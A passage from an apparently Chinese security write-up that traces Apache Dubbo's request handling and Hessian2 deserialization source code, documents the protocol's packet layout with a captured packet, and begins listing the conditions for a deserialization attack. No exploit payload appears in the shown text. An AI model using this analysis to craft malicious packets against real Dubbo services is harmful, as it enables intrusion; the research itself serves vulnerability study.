                            + " please update the api interface. url is:"
                            + invoker.getUrl()) + " ,invocation is :" + inv);
                    return null;
                `}`
            `}`
            RpcContext.getContext().setRemoteAddress(channel.getRemoteAddress());
            return invoker.invoke(inv);
        `}`
        throw new RemotingException(channel, "Unsupported request: "
                + (message == null ? null : (message.getClass().getName() + ": " + message))
                + ", channel: consumer: " + channel.getRemoteAddress() + " --&gt; provider: " + channel.getLocalAddress());
    `}`

    @Override
    public void received(Channel channel, Object message) throws RemotingException `{`
        if (message instanceof Invocation) `{`
            reply((ExchangeChannel) channel, message);
        `}` else `{`
            super.received(channel, message);
        `}`
    `}`

    @Override
    public void connected(Channel channel) throws RemotingException `{`
        invoke(channel, Constants.ON_CONNECT_KEY);
    `}`

    @Override
    public void disconnected(Channel channel) throws RemotingException `{`
        if (logger.isInfoEnabled()) `{`
            logger.info("disconnected from " + channel.getRemoteAddress() + ",url:" + channel.getUrl());
        `}`
        invoke(channel, Constants.ON_DISCONNECT_KEY);
    `}`

    private void invoke(Channel channel, String methodKey) `{`
        Invocation invocation = createInvocation(channel, channel.getUrl(), methodKey);
        if (invocation != null) `{`
            try `{`
                received(channel, invocation);
            `}` catch (Throwable t) `{`
                logger.warn("Failed to invoke event method " + invocation.getMethodName() + "(), cause: " + t.getMessage(), t);
            `}`
        `}`
    `}`

    private Invocation createInvocation(Channel channel, URL url, String methodKey) `{`
        String method = url.getParameter(methodKey);
        if (method == null || method.length() == 0) `{`
            return null;
        `}`
        RpcInvocation invocation = new RpcInvocation(method, new Class&lt;?&gt;[0], new Object[0]);
        invocation.setAttachment(Constants.PATH_KEY, url.getPath());
        invocation.setAttachment(Constants.GROUP_KEY, url.getParameter(Constants.GROUP_KEY));
        invocation.setAttachment(Constants.INTERFACE_KEY, url.getParameter(Constants.INTERFACE_KEY));
        invocation.setAttachment(Constants.VERSION_KEY, url.getParameter(Constants.VERSION_KEY));
        if (url.getParameter(Constants.STUB_EVENT_KEY, false)) `{`
            invocation.setAttachment(Constants.STUB_EVENT_KEY, Boolean.TRUE.toString());
        `}`
        return invocation;
    `}`
`}`;
```

但在bind的时候，因为默认SPI选择的是HeaderExchanger，分析它的bind方法，可以看到，其ExchangeHandler被进行了多层封装：

```
public class HeaderExchanger implements Exchanger `{`

    public static final String NAME = "header";

    @Override
    public ExchangeClient connect(URL url, ExchangeHandler handler) throws RemotingException `{`
        return new HeaderExchangeClient(Transporters.connect(url, new DecodeHandler(new HeaderExchangeHandler(handler))), true);
    `}`

    @Override
    public ExchangeServer bind(URL url, ExchangeHandler handler) throws RemotingException `{`
        return new HeaderExchangeServer(Transporters.bind(url, new DecodeHandler(new HeaderExchangeHandler(handler))));
    `}`

`}`
```

跟进Transporters.bind，可以看到，还是使用了SPI

```
public static Server bind(URL url, ChannelHandler... handlers) throws RemotingException `{`
    if (url == null) `{`
        throw new IllegalArgumentException("url == null");
    `}`
    if (handlers == null || handlers.length == 0) `{`
        throw new IllegalArgumentException("handlers == null");
    `}`
    ChannelHandler handler;
    if (handlers.length == 1) `{`
        handler = handlers[0];
    `}` else `{`
        handler = new ChannelHandlerDispatcher(handlers);
    `}`
    return getTransporter().bind(url, handler);
`}`

public static Transporter getTransporter() `{`
    return ExtensionLoader.getExtensionLoader(Transporter.class).getAdaptiveExtension();
`}`

@SPI("netty")
public interface Transporter `{`

    /**
     * Bind a server.
     *
     * @param url     server url
     * @param handler
     * @return server
     * @throws RemotingException
     * @see com.alibaba.dubbo.remoting.Transporters#bind(URL, ChannelHandler...)
     */
    @Adaptive(`{`Constants.SERVER_KEY, Constants.TRANSPORTER_KEY`}`)
    Server bind(URL url, ChannelHandler handler) throws RemotingException;

    /**
     * Connect to a server.
     *
     * @param url     server url
     * @param handler
     * @return client
     * @throws RemotingException
     * @see com.alibaba.dubbo.remoting.Transporters#connect(URL, ChannelHandler...)
     */
    @Adaptive(`{`Constants.CLIENT_KEY, Constants.TRANSPORTER_KEY`}`)
    Client connect(URL url, ChannelHandler handler) throws RemotingException;

`}`
```

根据dubbo改造的SPI原理，因为我们并没有对Transporter的实现进行配置，所以，默认会选择注解[@SPI](https://github.com/SPI)(“netty”)指定的NettyTransporter实现进行bind

```
public class NettyTransporter implements Transporter `{`

    public static final String NAME = "netty";

    @Override
    public Server bind(URL url, ChannelHandler listener) throws RemotingException `{`
        return new NettyServer(url, listener);
    `}`

    @Override
    public Client connect(URL url, ChannelHandler listener) throws RemotingException `{`
        return new NettyClient(url, listener);
    `}`

`}`
```

可以看到，其实服务提供者和消费者，默认最终bind和connect都执行到这里，bind创建了一个netty的服务，也就是tcp的监听器，说到netty，我们知道，一个netty服务，对于数据包的解析或者封装，都会用到pipe，而我们这篇文章的最核心点就在其中的pipe

```
public class NettyServer extends AbstractServer implements Server `{`

    private static final Logger logger = LoggerFactory.getLogger(NettyServer.class);

    private Map&lt;String, Channel&gt; channels; // &lt;ip:port, channel&gt;

    private ServerBootstrap bootstrap;

    private org.jboss.netty.channel.Channel channel;

    public NettyServer(URL url, ChannelHandler handler) throws RemotingException `{`
        super(url, ChannelHandlers.wrap(handler, ExecutorUtil.setThreadName(url, SERVER_THREAD_POOL_NAME)));
    `}`

    @Override
    protected void doOpen() throws Throwable `{`
        NettyHelper.setNettyLoggerFactory();
        ExecutorService boss = Executors.newCachedThreadPool(new NamedThreadFactory("NettyServerBoss", true));
        ExecutorService worker = Executors.newCachedThreadPool(new NamedThreadFactory("NettyServerWorker", true));
        ChannelFactory channelFactory = new NioServerSocketChannelFactory(boss, worker, getUrl().getPositiveParameter(Constants.IO_THREADS_KEY, Constants.DEFAULT_IO_THREADS));
        bootstrap = new ServerBootstrap(channelFactory);

        final NettyHandler nettyHandler = new NettyHandler(getUrl(), this);
        channels = nettyHandler.getChannels();
        // https://issues.jboss.org/browse/NETTY-365
        // https://issues.jboss.org/browse/NETTY-379
        // final Timer timer = new HashedWheelTimer(new NamedThreadFactory("NettyIdleTimer", true));
        bootstrap.setOption("child.tcpNoDelay", true);
        bootstrap.setPipelineFactory(new ChannelPipelineFactory() `{`
            @Override
            public ChannelPipeline getPipeline() `{`
                NettyCodecAdapter adapter = new NettyCodecAdapter(getCodec(), getUrl(), NettyServer.this);
                ChannelPipeline pipeline = Channels.pipeline();
                /*int idleTimeout = getIdleTimeout();
                if (idleTimeout &gt; 10000) `{`
                    pipeline.addLast("timer", new IdleStateHandler(timer, idleTimeout / 1000, 0, 0));
                `}`*/
                pipeline.addLast("decoder", adapter.getDecoder());
                pipeline.addLast("encoder", adapter.getEncoder());
                pipeline.addLast("handler", nettyHandler);
                return pipeline;
            `}`
        `}`);
        // bind
        channel = bootstrap.bind(getBindAddress());
    `}`

    //...
`}`
```

从上面的代码中，可以找到pipe链有两个分别是decoder和encoder，分别是对接收的数据进行解码，以及对响应数据进行编码。其中的解码和编码器实现，从NettyCodecAdapter获取，而NettyCodecAdapter中通过内部类的方式实现了解码和编码器，但真正的核心编解码还是交给了Codec2

Codec2的构造，我们重新回到NettyServer的构造方法：

```
public NettyServer(URL url, ChannelHandler handler) throws RemotingException `{`
    super(url, ChannelHandlers.wrap(handler, ExecutorUtil.setThreadName(url, SERVER_THREAD_POOL_NAME)));
`}`
```

继续跟进其父类AbstractServer的父类AbstractEndpoint的构造方法，就能看到Codec2也是通过SPI的方式获取

```
public AbstractEndpoint(URL url, ChannelHandler handler) `{`
    super(url, handler);
    this.codec = getChannelCodec(url);
    this.timeout = url.getPositiveParameter(Constants.TIMEOUT_KEY, Constants.DEFAULT_TIMEOUT);
    this.connectTimeout = url.getPositiveParameter(Constants.CONNECT_TIMEOUT_KEY, Constants.DEFAULT_CONNECT_TIMEOUT);
`}`

protected static Codec2 getChannelCodec(URL url) `{`
    String codecName = url.getParameter(Constants.CODEC_KEY, "telnet");
    if (ExtensionLoader.getExtensionLoader(Codec2.class).hasExtension(codecName)) `{`
        return ExtensionLoader.getExtensionLoader(Codec2.class).getExtension(codecName);
    `}` else `{`
        return new CodecAdapter(ExtensionLoader.getExtensionLoader(Codec.class)
                .getExtension(codecName));
    `}`
`}`

@SPI
public interface Codec2 `{`

    @Adaptive(`{`Constants.CODEC_KEY`}`)
    void encode(Channel channel, ChannelBuffer buffer, Object message) throws IOException;

    @Adaptive(`{`Constants.CODEC_KEY`}`)
    Object decode(Channel channel, ChannelBuffer buffer) throws IOException;


    enum DecodeResult `{`
        NEED_MORE_INPUT, SKIP_SOME_INPUT
    `}`

`}`
```

那么，具体这个Codec2使用的是哪个实现？我们也没对其进行配置，SPI对于的接口类中注解也没有配置默认实现。

其实，回到com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol#createServer中，我们可以看到，在这个方法中执行了这样一行代码，为URL重添加了一个配置参数：

```
url = url.addParameter(Constants.CODEC_KEY, DubboCodec.NAME);
```

所以，因为我们用的是dubbo协议，真正的Code2实现，是DubboCodec，位于module dubbo-rpc-dubbo中，包com.alibaba.dubbo.rpc.protocol.dubbo下。

我们暂时只关注解码，从decodeBody方法，我们可以清晰看到，dubbo协议自己定义了协议通讯时的数据包头和体：

```
protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException `{`
    byte flag = header[2], proto = (byte) (flag &amp; SERIALIZATION_MASK);
    // get request id.
    long id = Bytes.bytes2long(header, 4);
    if ((flag &amp; FLAG_REQUEST) == 0) `{`
        // decode response.
        Response res = new Response(id);
        if ((flag &amp; FLAG_EVENT) != 0) `{`
            res.setEvent(true);
        `}`
        // get status.
        byte status = header[3];
        res.setStatus(status);
        try `{`
            ObjectInput in = CodecSupport.deserialize(channel.getUrl(), is, proto);
            if (status == Response.OK) `{`
                Object data;
                if (res.isHeartbeat()) `{`
                    data = decodeHeartbeatData(channel, in);
                `}` else if (res.isEvent()) `{`
                    data = decodeEventData(channel, in);
                `}` else `{`
                    data = decodeResponseData(channel, in, getRequestData(id));
                `}`
                res.setResult(data);
            `}` else `{`
                res.setErrorMessage(in.readUTF());
            `}`
        `}` catch (Throwable t) `{`
            res.setStatus(Response.CLIENT_ERROR);
            res.setErrorMessage(StringUtils.toString(t));
        `}`
        return res;
    `}` else `{`
        // decode request.
        Request req = new Request(id);
        req.setVersion(Version.getProtocolVersion());
        req.setTwoWay((flag &amp; FLAG_TWOWAY) != 0);
        if ((flag &amp; FLAG_EVENT) != 0) `{`
            req.setEvent(true);
        `}`
        try `{`
            ObjectInput in = CodecSupport.deserialize(channel.getUrl(), is, proto);
            Object data;
            if (req.isHeartbeat()) `{`
                data = decodeHeartbeatData(channel, in);
            `}` else if (req.isEvent()) `{`
                data = decodeEventData(channel, in);
            `}` else `{`
                data = decodeRequestData(channel, in);
            `}`
            req.setData(data);
        `}` catch (Throwable t) `{`
            // bad request
            req.setBroken(true);
            req.setData(t);
        `}`
        return req;
    `}`
`}`
```

下面是我对其协议的一些整理总结：

header：

```
0-7位和8-15位：Magic High和Magic Low，类似java字节码文件里的魔数，用来判断是不是dubbo协议的数据包，就是一个固定的数字
16位：Req/Res：请求还是响应标识。
17位：2way：单向还是双向
18位：Event：是否是事件
19-23位：Serialization 编号
24-31位：status状态
32-95位：id编号
96-127位：body数据长度
128-…位：body
```

body：

```
1.dubboVersion
2.path
3.version
4.methodName
5.methodDesc
6.paramsObject
7.map
```

rpc tcp报文（ascii）：

```
...           .G.2.0.20,com.threedr3am.learn.server.boot.DemoService.1.0.hello0$Lcom/threedr3am/learn/server/boot/A;C0"com.threedr3am.learn.server.boot.A..name`.xxxxH.path0,com.threedr3am.learn.server.boot.DemoService.activelimit_filter_start_time 1577081623564 interface0,com.threedr3am.learn.server.boot.DemoService.version.1.0.timeout.3000Z

```

rpc tcp报文（hex）：

```
dabb c200 0000 0000 0000 0000 0000 0149
0532 2e30 2e32 302c 636f 6d2e 7468 7265
6564 7233 616d 2e6c 6561 726e 2e73 6572
7665 722e 626f 6f74 2e44 656d 6f53 6572
7669 6365 0331 2e30 0568 656c 6c6f 3024
4c63 6f6d 2f74 6872 6565 6472 3361 6d2f
6c65 6172 6e2f 7365 7276 6572 2f62 6f6f
742f 413b 4330 2263 6f6d 2e74 6872 6565
6472 3361 6d2e 6c65 6172 6e2e 7365 7276
6572 2e62 6f6f 742e 4191 046e 616d 6560
0678 7561 6e79 6848 0470 6174 6830 2c63
6f6d 2e74 6872 6565 6472 3361 6d2e 6c65
6172 6e2e 7365 7276 6572 2e62 6f6f 742e
4465 6d6f 5365 7276 6963 651d 6163 7469
7665 6c69 6d69 745f 6669 6c74 6572 5f73
7461 7274 5f74 696d 650d 3135 3737 3038
3332 3138 3432 3209 696e 7465 7266 6163
6530 2c63 6f6d 2e74 6872 6565 6472 3361
6d2e 6c65 6172 6e2e 7365 7276 6572 2e62
6f6f 742e 4465 6d6f 5365 7276 6963 6507
7665 7273 696f 6e03 312e 3007 7469 6d65
6f75 7404 3330 3030 5a
```

接着，直奔我们这次最最核心的地方，CodecSupport.deserialize，它封装了输入流对象，并通过SPI选择对应的反序列化实现，在decode解码输入流时，对其数据进行反序列化：

```
public static ObjectInput deserialize(URL url, InputStream is, byte proto) throws IOException `{`
    Serialization s = getSerialization(url, proto);
    return s.deserialize(url, is);
`}`
```

```
public static Serialization getSerialization(URL url, Byte id) throws IOException `{`
    Serialization serialization = getSerializationById(id);
    String serializationName = url.getParameter(Constants.SERIALIZATION_KEY, Constants.DEFAULT_REMOTING_SERIALIZATION);
    // Check if "serialization id" passed from network matches the id on this side(only take effect for JDK serialization), for security purpose.
    if (serialization == null
            || ((id == 3 || id == 7 || id == 4) &amp;&amp; !(serializationName.equals(ID_SERIALIZATIONNAME_MAP.get(id))))) `{`
        throw new IOException("Unexpected serialization id:" + id + " received from network, please check if the peer send the right id.");
    `}`
    return serialization;
`}`
```

到这里，我们其实已经了解服务提供者service暴露的大概源码细节了，我这边就不再跟进消费者refer服务以及invoke时的源码细节了，因为大体流程其实也差不了多远，下一节，我们将浅析反序列化部分的源码实现，也是我们主要的关注点。



## 0x03 hessian2反序列化

上一节中，我们最终跟到了DubboCodec的decodeBody方法实现，这个方法会对使用了dubbo协议的数据包进行解析，根据包数据，判断是请求还是响应，接着根据SPI选择反序列化实现进行反序列化。

在调用CodecSupport的deserialize方法时，我们可以看到它传入的第三个参数proto，这是从dubbo协议数据包的header部获取的数据，在header的19-23位，表示Serialization编号，在获取反序列化实现时，根据这个编号从ID_SERIALIZATION_MAP缓存中取出相应的反序列化实现

CodecSupport：

```
public static Serialization getSerializationById(Byte id) `{`
    return ID_SERIALIZATION_MAP.get(id);
`}`

public static Serialization getSerialization(URL url, Byte id) throws IOException `{`
    Serialization serialization = getSerializationById(id);
    String serializationName = url.getParameter(Constants.SERIALIZATION_KEY, Constants.DEFAULT_REMOTING_SERIALIZATION);
    // Check if "serialization id" passed from network matches the id on this side(only take effect for JDK serialization), for security purpose.
    if (serialization == null
            || ((id == 3 || id == 7 || id == 4) &amp;&amp; !(serializationName.equals(ID_SERIALIZATIONNAME_MAP.get(id))))) `{`
        throw new IOException("Unexpected serialization id:" + id + " received from network, please check if the peer send the right id.");
    `}`
    return serialization;
`}`
```

那也就是说，我们是否可以随意修改数据包中的Serialization编号编号，选择更容易被利用的反序列化实现？

然而并不行，从上面代码，其实我们能看到有个if判断，如果编号为3、4、7或者编号取出的反序列化实现名称和服务提供者端配置的不一致，都会抛出异常。

而在缺省配置下，默认dubbo协议的反序列化，使用的是hessian2实现。

接着，跟进请求消息体的解码实现：

```
protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException `{`
    //...
    if ((flag &amp; FLAG_REQUEST) == 0) `{`
        //...
    `}` else `{`
        //...
        try `{`
            //...
            if (req.isHeartbeat()) `{`
                //...
            `}` else if (req.isEvent()) `{`
                //...
            `}` else `{`
                //...
                if (channel.getUrl().getParameter(
                        Constants.DECODE_IN_IO_THREAD_KEY,
                        Constants.DEFAULT_DECODE_IN_IO_THREAD)) `{`
                    inv = new DecodeableRpcInvocation(channel, req, is, proto);
                    inv.decode();
                `}` else `{`
                    //...
                `}`
                //...
            `}`
            //...
        `}` catch (Throwable t) `{`
            //...
        `}`
        return req;
    `}`
`}`
```

DecodeableRpcInvocation.decode：

```
@Override
public void decode() throws Exception `{`
    if (!hasDecoded &amp;&amp; channel != null &amp;&amp; inputStream != null) `{`
        try `{`
            decode(channel, inputStream);
        `}` catch (Throwable e) `{`
            if (log.isWarnEnabled()) `{`
                log.warn("Decode rpc invocation failed: " + e.getMessage(), e);
            `}`
            request.setBroken(true);
            request.setData(e);
        `}` finally `{`
            hasDecoded = true;
        `}`
    `}`
`}`
```

```
@Override
public Object decode(Channel channel, InputStream input) throws IOException `{`
    ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), serializationType)
            .deserialize(channel.getUrl(), input);
    //读取dubbo版本号
    String dubboVersion = in.readUTF();
    //设置dubbo版本号到请求对象中
    request.setVersion(dubboVersion);

    setAttachment(Constants.DUBBO_VERSION_KEY, dubboVersion);

    setAttachment(Constants.PATH_KEY, in.readUTF());
    setAttachment(Constants.VERSION_KEY, in.readUTF());

    //设置方法名到RpcInvocation中，用于指定调用的方法
    setMethodName(in.readUTF());
    try `{`
        Object[] args;
        Class&lt;?&gt;[] pts;
        //读取方法描述
        String desc = in.readUTF();
        if (desc.length() == 0) `{`
            pts = DubboCodec.EMPTY_CLASS_ARRAY;
            args = DubboCodec.EMPTY_OBJECT_ARRAY;
        `}` else `{`
            //根据方法描述，加载入参class，存储成数组
            pts = ReflectUtils.desc2classArray(desc);
            args = new Object[pts.length];
            for (int i = 0; i &lt; args.length; i++) `{`
                try `{`
                    //根据方法描述的class，反序列化读取入参对象
                    args[i] = in.readObject(pts[i]);
                `}` catch (Exception e) `{`
                    if (log.isWarnEnabled()) `{`
                        log.warn("Decode argument failed: " + e.getMessage(), e);
                    `}`
                `}`
            `}`
        `}`
        setParameterTypes(pts);

        //反序列化读取map集合，如果不为空，则全部数据放到attachment集合中
        Map&lt;String, String&gt; map = (Map&lt;String, String&gt;) in.readObject(Map.class);
        if (map != null &amp;&amp; map.size() &gt; 0) `{`
            Map&lt;String, String&gt; attachment = getAttachments();
            if (attachment == null) `{`
                attachment = new HashMap&lt;String, String&gt;();
            `}`
            attachment.putAll(map);
            setAttachments(attachment);
        `}`
        //decode argument ,may be callback
        for (int i = 0; i &lt; args.length; i++) `{`
            args[i] = decodeInvocationArgument(channel, this, pts, i, args[i]);
        `}`

        setArguments(args);

    `}` catch (ClassNotFoundException e) `{`
        throw new IOException(StringUtils.toString("Read invocation data failed.", e));
    `}` finally `{`
        if (in instanceof Cleanable) `{`
            ((Cleanable) in).cleanup();
        `}`
    `}`
    return this;
`}`
```

具体的消息体的组成结构为：

```
1.dubboVersion
2.path
3.version
4.methodName
5.methodDesc
6.paramsObject
7.map
```

接着，跟进默认hessian2的反序列化实现，readObject中

com.alibaba.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readObject(java.lang.Class&lt;T&gt;)：

```
@Override
@SuppressWarnings("unchecked")
public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException,
        ClassNotFoundException `{`
    return (T) mH2i.readObject(cls);
`}`
```

readObject对mH2这个对象进行了封装，看Hessian2ObjectInput构造方法：

```
private final Hessian2Input mH2i;

public Hessian2ObjectInput(InputStream is) `{`
    mH2i = new Hessian2Input(is);
    mH2i.setSerializerFactory(Hessian2SerializerFactory.SERIALIZER_FACTORY);
`}`
```

封装的类对象为Hessian2Input，跟进Hessian2Input的readObject方法实现：

```
public Object readObject(Class cl) throws IOException `{`
    return this.readObject(cl, null, null);
`}`

@Override
public Object readObject(Class expectedClass, Class&lt;?&gt;... expectedTypes) throws IOException `{`
    if (expectedClass == null || expectedClass == Object.class)
        return readObject();

    int tag = _offset &lt; _length ? (_buffer[_offset++] &amp; 0xff) : read();

    switch (tag) `{`
        case 'N':
            return null;

        case 'H': `{`
            Deserializer reader = findSerializerFactory().getDeserializer(expectedClass);

            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.length == 2;
            // fix deserialize of short type
            return reader.readMap(this
                    , keyValuePair ? expectedTypes[0] : null
                    , keyValuePair ? expectedTypes[1] : null);
        `}`

        case 'M': `{`
            String type = readType();

            // hessian/3bb3
            if ("".equals(type)) `{`
                Deserializer reader;
                reader = findSerializerFactory().getDeserializer(expectedClass);

                return reader.readMap(this);
            `}` else `{`
                Deserializer reader;
                reader = findSerializerFactory().getObjectDeserializer(type, expectedClass);

                return reader.readMap(this);
            `}`
        `}`

        case 'C': `{`
            readObjectDefinition(expectedClass);

            return readObject(expectedClass);
        `}`

        case 0x60:
        case 0x61:
        case 0x62:
        case 0x63:
        case 0x64:
        case 0x65:
        case 0x66:
        case 0x67:
        case 0x68:
        case 0x69:
        case 0x6a:
        case 0x6b:
        case 0x6c:
        case 0x6d:
        case 0x6e:
        case 0x6f: `{`
            int ref = tag - 0x60;
            int size = _classDefs.size();

            if (ref &lt; 0 || size &lt;= ref)
                throw new HessianProtocolException("'" + ref + "' is an unknown class definition");

            ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);

            return readObjectInstance(expectedClass, def);
        `}`

        case 'O': `{`
            int ref = readInt();
            int size = _classDefs.size();

            if (ref &lt; 0 || size &lt;= ref)
                throw new HessianProtocolException("'" + ref + "' is an unknown class definition");

            ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);

            return readObjectInstance(expectedClass, def);
        `}`

        case BC_LIST_VARIABLE: `{`
            String type = readType();

            Deserializer reader;
            reader = findSerializerFactory().getListDeserializer(type, expectedClass);

            Object v = reader.readList(this, -1);

            return v;
        `}`

        case BC_LIST_FIXED: `{`
            String type = readType();
            int length = readInt();

            Deserializer reader;
            reader = findSerializerFactory().getListDeserializer(type, expectedClass);

            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;

            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);

            return v;
        `}`

        case 0x70:
        case 0x71:
        case 0x72:
        case 0x73:
        case 0x74:
        case 0x75:
        case 0x76:
        case 0x77: `{`
            int length = tag - 0x70;

            String type = readType();

            Deserializer reader;
            reader = findSerializerFactory().getListDeserializer(null, expectedClass);

            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;

            // fix deserialize of short type
            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);

            return v;
        `}`

        case BC_LIST_VARIABLE_UNTYPED: `{`
            Deserializer reader;
            reader = findSerializerFactory().getListDeserializer(null, expectedClass);

            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;

            // fix deserialize of short type
            Object v = reader.readList(this, -1, valueType ? expectedTypes[0] : null);

            return v;
        `}`

        case BC_LIST_FIXED_UNTYPED: `{`
            int length = readInt();

            Deserializer reader;
            reader = findSerializerFactory().getListDeserializer(null, expectedClass);

            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;

            // fix deserialize of short type
            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);

            return v;
        `}`

        case 0x78:
        case 0x79:
        case 0x7a:
        case 0x7b:
        case 0x7c:
        case 0x7d:
        case 0x7e:
        case 0x7f: `{`
            int length = tag - 0x78;

            Deserializer reader;
            reader = findSerializerFactory().getListDeserializer(null, expectedClass);

            boolean valueType = expectedTypes != null &amp;&amp; expectedTypes.length == 1;

            // fix deserialize of short type
            Object v = reader.readLengthList(this, length, valueType ? expectedTypes[0] : null);

            return v;
        `}`

        case BC_REF: `{`
            int ref = readInt();

            return _refs.get(ref);
        `}`
    `}`

    if (tag &gt;= 0)
        _offset--;

    // hessian/3b2i vs hessian/3406
    // return readObject();
    Object value = findSerializerFactory().getDeserializer(expectedClass).readObject(this);
    return value;
`}`
```

可以看到，其实现代码非常长，但是不难理解，hessian2的readObject反序列化，都是根据读到约定的字符tag，从而进行约定的数据读取处理

这样，根据我们抓包得到的序列化数据，我们就不难理解其结构组成了：

```
...           .G.2.0.20,com.threedr3am.learn.server.boot.DemoService.1.0.hello0$Lcom/threedr3am/learn/server/boot/A;C0"com.threedr3am.learn.server.boot.A..name`.xxxxH.path0,com.threedr3am.learn.server.boot.DemoService.activelimit_filter_start_time 1577081623564 interface0,com.threedr3am.learn.server.boot.DemoService.version.1.0.timeout.3000Z

```
- .G.2.0.20：dubbo版本
- com.threedr3am.learn.server.boot.DemoService：path
- 1.0：version
- hello0：方法名
- Lcom/threedr3am/learn/server/boot/A;：方法描述
hessian-tag：
- C：类定义
- H：键值对
- …具体细节也不详细描述
其实，我们只要知道了dubbo协议请求的数据结构组成，那么，我们就能随意创建数据包，去进行反序列化攻击。

但是，对hessian2反序列化，有一个关键的细节，就是对于类的反射构造实例化，会有比较大的限制：

```
case 'C': `{`
    readObjectDefinition(expectedClass);

    return readObject(expectedClass);
`}`

private void readObjectDefinition(Class cl)
        throws IOException `{`
    String type = readString();
    int len = readInt();

    String[] fieldNames = new String[len];
    for (int i = 0; i &lt; len; i++)
        fieldNames[i] = readString();

    ObjectDefinition def = new ObjectDefinition(type, fieldNames);

    if (_classDefs == null)
        _classDefs = new ArrayList();

    _classDefs.add(def);
`}`
```

从前面所说的数据包，以及C这个tag的含义，我们可以看到，数据包的反序列化，会先对方法传入参数对应的class，进行类定义的读取，接着

```
case 0x60:
case 0x61:
case 0x62:
case 0x63:
case 0x64:
case 0x65:
case 0x66:
case 0x67:
case 0x68:
case 0x69:
case 0x6a:
case 0x6b:
case 0x6c:
case 0x6d:
case 0x6e:
case 0x6f: `{`
    int ref = tag - 0x60;
    int size = _classDefs.size();

    if (ref &lt; 0 || size &lt;= ref)
        throw new HessianProtocolException("'" + ref + "' is an unknown class definition");

    ObjectDefinition def = (ObjectDefinition) _classDefs.get(ref);

    return readObjectInstance(expectedClass, def);
`}`
```

进行实例的反序列化

```
private Object readObjectInstance(Class cl, ObjectDefinition def)
        throws IOException `{`
    String type = def.getType();
    String[] fieldNames = def.getFieldNames();

    if (cl != null) `{`
        Deserializer reader;
        reader = findSerializerFactory().getObjectDeserializer(type, cl);

        return reader.readObject(this, fieldNames);
    `}` else `{`
        return findSerializerFactory().readObject(this, type, fieldNames);
    `}`
`}`
```

可以看到`String type = def.getType();`读取了类定义，接着`String[] fieldNames = def.getFieldNames();`读取了类字段集合

因为反序列化的是java类，因此，Deserializer的实现为com.alibaba.com.caucho.hessian.io.JavaDeserializer，跟进其构造方法，可以看到：

```
public JavaDeserializer(Class cl) `{`
    _type = cl;
    _fieldMap = getFieldMap(cl);

    _readResolve = getReadResolve(cl);

    if (_readResolve != null) `{`
        _readResolve.setAccessible(true);
    `}`

    Constructor[] constructors = cl.getDeclaredConstructors();
    long bestCost = Long.MAX_VALUE;

    for (int i = 0; i &lt; constructors.length; i++) `{`
        Class[] param = constructors[i].getParameterTypes();
        long cost = 0;

        for (int j = 0; j &lt; param.length; j++) `{`
            cost = 4 * cost;

            if (Object.class.equals(param[j]))
                cost += 1;
            else if (String.class.equals(param[j]))
                cost += 2;
            else if (int.class.equals(param[j]))
                cost += 3;
            else if (long.class.equals(param[j]))
                cost += 4;
            else if (param[j].isPrimitive())
                cost += 5;
            else
                cost += 6;
        `}`

        if (cost &lt; 0 || cost &gt; (1 &lt;&lt; 48))
            cost = 1 &lt;&lt; 48;

        cost += (long) param.length &lt;&lt; 48;

        if (cost &lt; bestCost) `{`
            _constructor = constructors[i];
            bestCost = cost;
        `}`
    `}`

    if (_constructor != null) `{`
        _constructor.setAccessible(true);
        Class[] params = _constructor.getParameterTypes();
        _constructorArgs = new Object[params.length];
        for (int i = 0; i &lt; params.length; i++) `{`
            _constructorArgs[i] = getParamArg(params[i]);
        `}`
    `}`
`}`
```

可以看到，构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法，而这，就是hessian2反序列化中最大的限制。

最终执行其reader.readObject(this, fieldNames)方法，完成类的反射方式实例化

```
@Override
public Object readObject(AbstractHessianInput in, String[] fieldNames)
        throws IOException `{`
    try `{`
        Object obj = instantiate();

        return readObject(in, obj, fieldNames);
    `}` catch (IOException e) `{`
        throw e;
    `}` catch (RuntimeException e) `{`
        throw e;
    `}` catch (Exception e) `{`
        throw new IOExceptionWrapper(_type.getName() + ":" + e.getMessage(), e);
    `}`
`}`

protected Object instantiate()
        throws Exception `{`
    try `{`
        if (_constructor != null)
            return _constructor.newInstance(_constructorArgs);
        else
            return _type.newInstance();
    `}` catch (Exception e) `{`
        throw new HessianProtocolException("'" + _type.getName() + "' could not be instantiated", e);
    `}`
`}`
```

并在实例化后，把字段值设置进去

```
public Object readObject(AbstractHessianInput in,
                         Object obj,
                         String[] fieldNames)
        throws IOException `{`
    try `{`
        int ref = in.addRef(obj);

        for (int i = 0; i &lt; fieldNames.length; i++) `{`
            String name = fieldNames[i];

            FieldDeserializer deser = (FieldDeserializer) _fieldMap.get(name);

            if (deser != null)
                deser.deserialize(in, obj);
            else
                in.readObject();
        `}`

        Object resolve = resolve(obj);

        if (obj != resolve)
            in.setRef(ref, resolve);

        return resolve;
    `}` catch (IOException e) `{`
        throw e;
    `}` catch (Exception e) `{`
        throw new IOExceptionWrapper(obj.getClass().getName() + ":" + e, e);
    `}`
`}`
```

### <a class="reference-link" name="0x04%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8(hessian2)"></a>0x04 反序列化利用(hessian2)

在上一节中，详细的描述了dubbo默认的hessian2反序列化，通过上一节，我们也清楚的理解了hessian2的反序列化大概源码执行流程，以及其反序列化攻击的利用限制。

对其整理一下：
1. 默认dubbo协议+hessian2序列化方式
1. 序列化tcp包可随意修改方法参数反序列化的class
1. 反序列化时先通过构造方法实例化，然后在反射设置字段值
1. 构造方法的选择，只选择花销最小并且只有基本类型传入的构造方法
